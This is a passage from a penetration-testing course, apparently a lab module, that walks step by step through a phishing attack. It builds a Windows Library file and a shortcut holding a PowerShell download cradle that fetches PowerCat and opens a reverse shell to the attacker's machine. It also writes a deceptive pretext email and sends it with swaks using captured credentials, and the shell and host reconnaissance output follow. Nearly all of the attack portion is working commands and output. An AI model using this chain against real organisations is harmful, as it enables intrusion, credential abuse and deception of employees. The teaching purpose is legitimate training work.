

## Phishing for access assembling the pieces

## Phishing for Access

In this section, we'll perform a client-side attack by sending a phishing e-mail. Throughout this course, we've mainly discussed two client-side attack techniques: Microsoft Office documents containing Macros and Windows Library files in combination with shortcut files.

Because we don't have any information about the internal machines or infrastructure, we'll choose the second technique as Microsoft Office may not be installed on any of the target systems.

For this attack, we have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.

Let's begin by setting up the WebDAV share on our Kali machine on port 80 with _wsgidav_. In addition, we'll create the **/home/kali/beyond/webdav** directory as the WebDAV root directory.

```
kali@kali:~$ mkdir /home/kali/beyond/webdav

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
Running without configuration file.
04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
04:47:04.861 - INFO    : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
04:47:04.861 - INFO    : Lock manager:      LockManager(LockStorageDict)
04:47:04.861 - INFO    : Property manager:  None
04:47:04.861 - INFO    : Domain controller: SimpleDomainController()
04:47:04.861 - INFO    : Registered DAV providers by route:
04:47:04.861 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
04:47:04.861 - INFO    :   - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
04:47:05.149 - INFO    : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
04:47:05.149 - INFO    : Serving on http://0.0.0.0:80 ...
```

> Listing 33 - Starting WsgiDAV on port 80

Listing 33 shows that our WebDAV share is now served on port 80 with anonymous access settings.

Now, let's connect to WINPREP via RDP as _offsec_ with a password of _lab_ in order to prepare the Windows Library and shortcut files. Once connected, we'll open _Visual Studio Code_[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/assembling-the-pieces/gaining-access-to-the-internal-network/phishing-for-access#fn1) and create a new text file on the desktop named **config.Library-ms**.

![Figure 8: Empty Library file in Visual Studio Code](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/atpr/86df23bea32e5fbb78aff5c5054d6bf7-atp_lib_vsc.png)

Figure 8: Empty Library file in Visual Studio Code

Now, let's copy the Windows Library code we previously used in the _Client-Side Attacks_ Module, paste it into Visual Studio Code, and check that the IP address points to our Kali machine.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

> Listing 34 - Windows Library code for connecting to our WebDAV Share

Let's save the file and transfer it to **/home/kali/beyond** on our Kali machine.

Next, we'll create the shortcut file on WINPREP. For this, we'll right-click on the Desktop and select _New_ > _Shortcut_. A victim double-clicking the shortcut file will download PowerCat and create a reverse shell. We can enter the following command to achieve this:

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

> Listing 35 - PowerShell Download Cradle and PowerCat Reverse Shell Execution for shortcut file

Once we enter the command and **install** as shortcut file name, we can transfer the resulting shortcut file to our Kali machine into the WebDAV directory.

Our next step is to serve PowerCat via a Python3 web server. Let's copy **powercat.ps1** to **/home/kali/beyond** and serve it on port 8000 as we have specified in the shortcut's PowerShell command.

```
kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~/beyond$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

> Listing 36 - Serving powercat.ps1 on port 8000 via Python3 web server

Once the Python3 web server is running, we can start a Netcat listener on port 4444 in a new terminal tab to catch the incoming reverse shell from PowerCat.

```
kali@kali:~/beyond$ nc -nvlp 4444      
listening on [any] 4444 ...
```

> Listing 37 - Listening on port 4444 with Netcat

With Netcat running, all services and files are prepared. Now, let's create the email.

We could also use the WebDAV share to serve Powercat instead of the Python3 web server. However, serving the file via another port provides us additional flexibility.

To send the email, we'll use the command-line SMTP test tool _swaks_.[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/assembling-the-pieces/gaining-access-to-the-internal-network/phishing-for-access#fn2) As a first step, let's create the body of the email containing our pretext. Because we don't have specific information about any of the users, we have to use something more generic. Fortunately, we obtained some information about the target company on WEBSRV1 within the Git repository.

Including information only known to employees or staff will tremendously increase our chances that an attachment is opened.

We'll create the **body.txt** file in **/home/kali/beyond** with the following text:

```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

Hopefully this text will convince _marcus_ or _daniela_ to open our attachment.

In a real assessment we should also use passive information gathering techniques to obtain more information about a potential target. Based on this information, we could create more tailored emails and improve our chances of success tremendously.

Now we are ready to build the swaks command to send the emails. We'll provide **daniela@beyond.com** and **marcus@beyond.com** as recipients of the email to **-t**, **john@beyond.com** as name on the email envelope (sender) to **--from**, and the Windows Library file to **--attach**. Next, we'll enter **--suppress-data** to summarize information regarding the SMTP transactions. For the email subject and body, we'll provide **Subject: Staging Script** to **--header** and **body.txt** to **--body**. In addition, we'll enter the IP address of MAILSRV1 for **--server**. Finally, we'll add **-ap** to enable password authentication.

The complete command is shown in the following listing. Once entered, we have to provide the credentials of _john_:

```
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.50.242:25...
=== Connected to 192.168.50.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO kali
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 36 lines sent
<-  250 Queued (1.088 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

> Listing 38 - Sending emails with the Windows Library file as attachment to marcus and daniela

After waiting a few moments, we receive requests for our WebDAV and Python3 web servers. Let's check the Netcat listener.

```
listening on [any] 4444 ...
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 64264
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> 
```

> Listing 39 - Incoming reverse shell on port 4444

Great! Listing 39 shows that our client-side attack via email was successful and we obtained an interactive shell on a machine.

Let's display the current user, hostname, and IP address to confirm that we have an initial foothold in the internal network.

```
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus

PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1

PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.6.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
PS C:\Windows\System32\WindowsPowerShell\v1.0>
```

> Listing 40 - Obtaining basic information about the target machine

Listing 40 shows that we landed on the CLIENTWK1 system as domain user _marcus_. In addition, the IP address of the system is _172.16.6.243/24_, indicating an internal IP range. We should also document the IP address and network information, such as the subnet and gateway in our workspace directory.

Let's briefly summarize what we did in this section. First, we set up our Kali machine to provide the necessary services and files for our attack. Then, we prepared a Windows Library and shortcut file on WINPREP. Once we sent our email with the attachment, we received an incoming reverse shell from CLIENTWK1 in the internal network.